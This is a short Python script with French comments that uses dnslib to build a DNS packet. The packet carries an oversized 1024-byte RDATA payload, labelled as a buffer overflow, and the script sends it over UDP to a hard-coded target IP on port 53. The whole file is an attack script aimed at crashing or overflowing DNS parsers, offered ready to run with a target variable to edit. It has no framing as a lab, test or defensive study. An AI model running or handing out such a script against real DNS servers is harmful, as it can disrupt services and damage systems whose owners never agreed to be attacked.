import socket
from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, RR, RDMAP

# Utiliser un type brut pour le RDATA
class RawRData:
    def __init__(self, data):
        self.data = data

    def pack(self, *args):
        return self.data

    def __len__(self):
        return len(self.data)

# Enregistrer le type brut comme type valide dans dnslib
RDMAP['RAW'] = RawRData

def send_malicious_request(target_ip, target_port=53):
    try:
        # Construire l'en-tête de la requête
        header = DNSHeader(id=12345, qr=0, rd=1)
        question = DNSQuestion("example.com", QTYPE.A)

        # Champ RDATA malveillant (buffer overflow)
        payload = b"A" * 1024  # Dépassement de mémoire tampon
        rr = RR("example.com", QTYPE.A, rdata=RawRData(payload), ttl=300)

        # Assemblage de la requête DNS
        dns_record = DNSRecord(header, q=question)
        dns_record.add_answer(rr)

        # Envoi de la requête via UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(dns_record.pack(), (target_ip, target_port))
        print("[*] Requête malveillante envoyée à {}:{}.".format(target_ip, target_port))
        sock.close()

    except Exception as e:
        print("[!] Une erreur s'est produite :", str(e))

# Modifier l'adresse IP de la cible ici
target_ip = "192.168.136.2"
send_malicious_request(target_ip)
